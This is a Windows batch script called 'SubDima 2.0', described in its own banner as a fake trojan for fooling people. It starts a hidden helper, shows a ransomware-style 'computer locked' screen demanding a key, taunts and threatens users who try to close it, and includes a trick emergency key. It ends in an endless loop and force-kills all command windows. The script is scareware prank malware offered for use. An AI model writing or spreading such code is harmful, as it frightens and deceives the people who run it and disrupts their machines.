::=========================== Info ===========================
::
:: Version:	2.0
:: Harmful:	No
:: Folder(s):	%tmp%\SubDima
::
::============================================================
@echo off
title SUBDIMA 2.0
echo %* | findstr /I "tstmd"
if /I %errorlevel% == 0 (
set test=1
title SubDima 2.0 TEST MODE
)
if /I "%errorlevel%" == "1" set test=0
if /I "%1" == "about" goto :about
if /I "%1" == "init" goto :firstinit
if /I "%1" == "restart" goto :restarted
cls
goto :about

:about
echo ========================================
echo.
echo. SubDima version 2.0
echo.
echo ========================================
echo.
echo. About this program:
echo. SubDima is a manually distributed fake trojan.
echo. It is just to fool people and therefore is NOT harmful
echo. If you have never heard of SubDima though, you should delete it.
echo. Just before it actually does harm...
echo. 
echo.
echo. Q: Why is it called "SubDima"
echo. A: SubDima is short for Subdural Intimation.
echo.    Which is an anagram of Manual Distribution.
echo.
echo. Q: Who made it?
echo. A: Me.. Perhaps you can find out who I am by the way
echo.    this program is made. Im not gonna make it easy ;)
echo.
echo.
echo. Please do not execute this program using the launcher...
echo. Or do it and see the consequences
echo.
echo. (Its not harmful.. But what is it??)
echo.
echo ========================================
echo Press any key to exit... (But will it?)
pause > nul
exit

::============================== Start / Restart ==============================

:firstinit
echo Preparing first initialization...
echo 3 > "%tmp%\SUBDIMA\attempts"
set /p attempts=<"%tmp%\SUBDIMA\attempts"
if /I %test% == 0 start "" /min "%tmp%\SUBDIMA\taskender.bat" strt
echo Generating random key...
set key=%random%
cls
goto :code

:restarted
set /p attempts=<"%tmp%\SUBDIMA\attempts"
if /I %attempts% LSS 1 goto :noattempts
set /p restarts=< "%tmp%\SUBDIMA\count"
if /I %restarts% == 1 (
echo Oh shit, you actually closed me!!
echo I guess Ill change the code and give you only 1 attempt hehe
set attempts=1
set key=%random%%random%%random%%random%
timeout /t 3 /nobreak > nul
cls
goto :code
)
if /I %restarts% == 2 (
if /I %attempts% == 1 (
echo Welp... I warned you and even gave you a second chance
echo yet you continued...
set attempts=0
echo 0 > "%tmp%\SUBDIMA\attempts"
timeout /t 2 /nobreak > nul
cls
goto :noattempts
)
echo I RECOMMEND YOU STOP DOING THAT OR FACE THE CONSEQUENCES
echo THIS IS YOUR LAST WARNING
set attempts=1
echo 1 > "%tmp%\SUBDIMA\attempts"
set key=%random%%random%%random%%random%
timeout /t 3 /nobreak > nul
cls
goto :code
)
if /I %restarts% == 3 (
echo I WARNED YOU...
set attempts=0
echo 0 > "%tmp%\SUBDIMA\attempts"
timeout /t 2 /nobreak > nul
cls
goto :noattempts
)

::============================== Main ==============================

:code
if /I %attempts% LSS 1 goto :noattempts
echo. THIS COMPUTER HAS BEEN LOCKED BY SUBDIMA
echo.
echo. Don't worry, your files are still there.. if you have a key
echo. Please don't try to close me as it will only make things worse
echo.
echo. To unlock this PC, please enter a valid key.
echo. %attempts% attempts left...
if /I "%test%" == "1" (
echo.
echo for the sake of testing.. %key% is the key
echo or use the emergency key "dimsum" (without quotes)
)
echo.
set /p input=Input: 
if /I "%input%" == "%key%" goto :unlock
if /I "%test%" == "1" (
if /I "%input%" == "dimsum" goto :unlock
)
if /I "%test%" == "0" (
    if /I "%input%" == "dimsum" (
        cls
        echo Whaha, you actually found the emergency key!
        timeout /t 3 /nobreak > nul
        echo Though this is not test mode, YOU'RE FUCKED HAHAHA
	set /a attempts=%attempts%-1
	echo %attempts% > "%tmp%\SUBDIMA\attempts"
        timeout /t 4 /nobreak > nul
        cls
        goto :code
    )
)
set /a attempts=%attempts%-1
echo %attempts% > "%tmp%\SUBDIMA\attempts"
cls
goto :code

::============================== Payload ==============================

:noattempts
cls
start "" "%tmp%\SUBDIMA\notepad.vbs"
timeout /t 5 /nobreak > nul
if /I "%test%" == "0" goto :payload
if /I "%test%" == "1" (
goto :remove
)

:payload
echo. > "%tmp%\SUBDIMA\stop-taskend.pls"
:load
::start "" explorer.exe
::start "" winver.exe
goto :load

::============================== Removal ==============================

:unlock
cls
echo. Oh wow.. you found the key...
echo. I guess ima leave now...
echo.
echo. Bye!!
timeout /t 4 /nobreak > nul
goto :remove

:remove
powershell "taskkill -im cmd.exe /f; rd /S /Q "$env:tmp\SUBDIMA; explorer.exe"
exit